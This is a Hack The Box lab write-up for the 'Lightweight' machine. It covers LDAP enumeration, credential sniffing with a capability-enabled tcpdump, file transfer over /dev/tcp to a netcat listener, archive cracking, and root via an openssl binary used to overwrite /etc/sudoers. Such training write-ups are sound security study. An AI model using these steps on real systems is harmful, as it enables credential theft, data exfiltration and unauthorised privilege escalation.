---
title: HTB-Lightweight
draft: false
tags:
  - htb
  - linux
  - ldap
  - tcpdump
  - openssl
  - wireshark
  - capabilities
  - sudoers
  - medium
---
## Information Gathering
### Rustscan

Rustscan found three ports open: SSH, HTTP, and LDAP

I usually see LDAP open on AD servers not on Linux servers so this was definitely something I should look into.

```bash
┌──(yoon㉿kali)-[~/Documents/htb/lightweight]
└─$ rustscan --addresses 10.10.10.119 --range 1-65535                     
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
<snip>
Host is up, received syn-ack (0.32s latency).
Scanned at 2024-03-29 01:11:19 EDT for 3s

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
389/tcp open  ldap    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.98 seconds
```


## Enumeration
### LDAP - TCP 389

I first queried base namingcontexts and added **lightweight.htb** to /etc/hosts file.

`ldapsearch -H ldap://10.10.10.119 -x -s base namingcontexts`

![](https://i.imgur.com/005Sd0f.png)


Luckily, null bind was allowed:

`ldapsearch -H ldap://10.10.10.119 -x -b "DC=lightweight,DC=htb"`

Usually LDAP will throw me few thousand lines of data but this for this case, output was only 100 lines.

#### Bind Result Analysis

Taking some time to carefully read through the data, I saw username and pasword hash is being exposed for **ldapuser1** and **ldapuser2**.

**ldapuser1**'s user password hash is exposed:

![](https://i.imgur.com/6HqIdpn.png)


There's one more piece of information about ldapuser1 and it also had password hash exposed:

![](https://i.imgur.com/obJthaW.png)


**ldapuser2**'s user password hash was also exposed:

![](https://i.imgur.com/EYxHUxt.png)


**ldapuser2** also had a same piece of data that I did not know what it was:

![](https://i.imgur.com/BqgLhEB.png)


### Hash Crack
There were three different hashes that I did not know what they are.

First, I had hash found for ldapuser1:

```ldapuser1
e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R
 oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
```

I also had a hash found for ldapuser2:

```ldapuser2
e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
 zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
```

There was one hash that was common for both users:

```common hash
e2NyeXB0fXg=
```

I decoded all three files with **base64**

![](https://i.imgur.com/lnOMPtz.png)


Now I have password hashes but SHA-512 is almost impossible to crack: 

| Format  | Encryption Algorithm | Complexity                  | Difficulty to Crack       |
|---------|----------------------|-----------------------------|---------------------------|
| $1$     | MD5                  | Relatively Simple           | Easy (Vulnerable to Brute-Force and Rainbow Tables) |
| $2$ or $2a$ or $2y$ | Blowfish (bcrypt)    | Complex                     | Difficult (Resistant to Brute-Force, Slow) |
| $5$     | SHA-256              | Complex                     | Difficult (Strong Resistance to Brute-Force, Salting) |
| $6$     | SHA-512              | Complex                     | Difficult (Strong Resistance to Brute-Force, Salting) |

At this point, I gave up on hash cracking and moved on.

### HTTP - TCP 80

Going to HTTP, it showed me a web page made with [slendr](https://github.com/joseluisq/slendr) and it was saying the site is being protected from bruteforcing:

![](https://i.imgur.com/j5ptHo0.png)


Visiting slendr's github page, I discovered that this web app is made on **Typescript**:

![](https://i.imgur.com/Awato07.png)


Searching for known exploit regarding typescript, it seemed it is vulnerable to RCE for certain versions. -> Unfortunately, it didn't work out.

![](https://i.imgur.com/A4mhJ15.png)




I spent some time trying to understand how web app is intereacting with the server.

**/info.php** noticed me that this site was built for pentesting and bruteforcing would block the attacking IP for 5 minutes: 

![](https://i.imgur.com/JzEhRdH.png)


**status.php** would show blocked IP:

![](https://i.imgur.com/tkriJ7L.png)


**user.php** told me that accessing web page through HTTP automatically created my IP address as the user on SSH:

![](https://i.imgur.com/2wYACOA.png)





### Shell as 10.10.14.17

I confirmed that I have ssh connection as my IP address:

![](https://i.imgur.com/CKbmtvC.png)


I saw several other users on home directory:

![](https://i.imgur.com/RXyeeEH.png)


## Privesc: 10.10.14.17 to ldapuser2
### Capabilities

I ran **linpeas.sh** and discovered something unusual:

![](https://i.imgur.com/QGEDAEi.png)


**tcpdump** was on the list for capabilities on this server and I would be able to capture packets with root privileges. You can read more about it [here](http://man7.org/linux/man-pages/man7/capabilities.7.html)

### LDAP Password Sniffing

I knew that there is LDAP running on the server and HTTP request to web app with automatically create an account. I hypothesized that web pages are somehow linked to LDAP service and it is creating account for me. So by sniffing on LDAP network, I might be able to obtain credentials for other users.

I started **tcpdump** sniffer on SSH connection and after moving around web page for a bit, it captured LDAP network traffic and it seemed to be related to **ldapuser2**:

`tcpdump -i lo -nnXs 0 'port 389'`

![](https://i.imgur.com/v2tCDYP.png)


Since this view isn't pretty, I forwarded the output to a pcap file so that I can open with Wireshark: 

`/usr/sbin/tcpdump -i any -s 0 -w lightweight.pcap`. 

![](https://i.imgur.com/UnYnJEs.png)


After that I copied the pcap file to local Kali machine:

`scp 10.10.14.17@lightweight.htb:/tmp/listen.pcap .`

![](https://i.imgur.com/QBsXWN3.png)


With the pcap file opened through wireshark, I filtered result for LDAP only:

![](https://i.imgur.com/ccHR1tK.png)


Authentication was made for ldapuser2 in plain text: **8bc8251332abe1d7f105d3e53ad39ac2**

![](https://i.imgur.com/iKzDnfG.png)



I tried SSH logging in as ldapuser2 with the found credentials but it didn't work:

![](https://i.imgur.com/23a8FVf.png)


However, changing into ldapuser2 from 10.10.14.17 was possible:

`su ldapuser2`

![](https://i.imgur.com/xo3dfOx.png)


## Privesc: ldapuser2 to ldapuser1
Listing home directory for ldapuser2, I discovered: **backup.7z**

![](https://i.imgur.com/c4PrKiE.png)



### File Transfer

With **netcat** listener running locally on Kali machine, I sent the contents of **backup.7z** file over the network to the listener running on the local machine:

`cat backup.7z > /dev/tcp/10.10.14.17/9001`

![](https://i.imgur.com/BWu6t6d.png)


Now on my local listener, the data receieved by Netcat is redirected to a file named backup.7z:

`nc -lvnp 9001 > backup.7z`

![](https://i.imgur.com/FtwfYyu.png)


### Crack

File was compressed with 7-zip version 0.4:

![](https://i.imgur.com/3B4rFB5.png)

I tried unzipping with **7z** and it require a password:

`7z x backup.7z`

![](https://i.imgur.com/2InZCaP.png)



Unfortunately password found earlier didn't work:

![](https://i.imgur.com/Hy9uqBZ.png)


Using **7z2john**, I created JohnTheRipper crackable file for backup.7z:

`7z2john backup.7z > backup.7z.crackit`

![](https://i.imgur.com/5IznNDF.png)

Using john, I cracked the password for backup.7zL **delete**

`john backup.7z.crackit --wordlist=/usr/share/wordlists/rockyou.txt`

![](https://i.imgur.com/8U2vo0U.png)


I unzipped backip.7z:

`7z x -pdelete backup.7z`

![](https://i.imgur.com/XNQXCEm.png)

I searched for the keyword **pass** and it seemed that there a interesting line on **status.php**:



`grep -i 'pass' *php`

![](https://i.imgur.com/LIYhge6.png)

I opened up **status.php** and it had password for **ldapuser1**: f3ca9d298a553da117442deeb6fa932d

![](https://i.imgur.com/5CyMuQN.png)

Now I can switch in ldapuser1:

`su ldapuser1`

![](https://i.imgur.com/4S04L19.png)


## Privesc: ldapuser 1 to root

Enumerating home directory for ** **, I saw several interesting files:

![](https://i.imgur.com/LuJQzCy.png)


I downloaded files to local side using nc again and took a look into them one by one. 

**ldapTLS.php** seemed to be a script for ldap over TLS in PHP. **capture.pcap** had nothing interesting other than creds for ldapuser2 which I already have. 

**openssl** and **tcpdump** were something that I usually don't see in home directory since they already exist in normal path:

![](https://i.imgur.com/b1CbiJj.png)


I decided to check for the difference for **tcpdump** and **openssl** in home directory and files in their normal path and it turned out they are identical:

`md5sum openssl /usr/bin/openssl tcpdump /usr/sbin/tcpdump`

![](https://i.imgur.com/pOkugRE.png)


Remembering capabilities for previous privilege escalation, I checked capabilities and found an interesting difference for **openssl**:

`getcap tcpdump /usr/sbin/tcpdump` & `getcap openssl /usr/bin/openssl`

![](https://i.imgur.com/6aSxQir.png)


**=ep** means this binary has **ALL** the capabilities.

### Reading as root

If I was just looking to read root.txt, It is very easy:

`./openssl base64 -in /root/root.txt | base64 -d`

![](https://i.imgur.com/FDwiEuw.png)


### Shell as root

I first read **sudoers** file using openssl and made a copy to home directory:

`./openssl enc -in /etc/sudoers > sudoers`

![](https://i.imgur.com/fo3LnlI.png)


I edited **sudoer** file and added root permissions for ldapuser1:

![](https://i.imgur.com/zHurKaJ.png)


After editing **sudoers** file, I replaced old sudoers file with the new one:

`cat ./sudoers | ./openssl enc -out /etc/sudoers`

![](https://i.imgur.com/FPtFZeb.png)


I confirmed ldapusers1's permission with `sudo -l`

![](https://i.imgur.com/frTSegk.png)


Root shell was created:

`sudo su -`

![](https://i.imgur.com/q2NryGK.png)


## Beyond Root
### Capabilities

Find out what capabilities are Enabled: `getcap -r / 2>/dev/null`



![](https://i.imgur.com/SlwkawP.png)


A classic example…

Let’s say tar has “tar = cap_dac_read_search+ep” which means tar has read access to anything. We can abuse this to read /etc/shadow by utilising the function of archiving a file.



## References
- https://linux-audit.com/linux-capabilities-101/
- https://gtfobins.github.io/gtfobins/openssl/


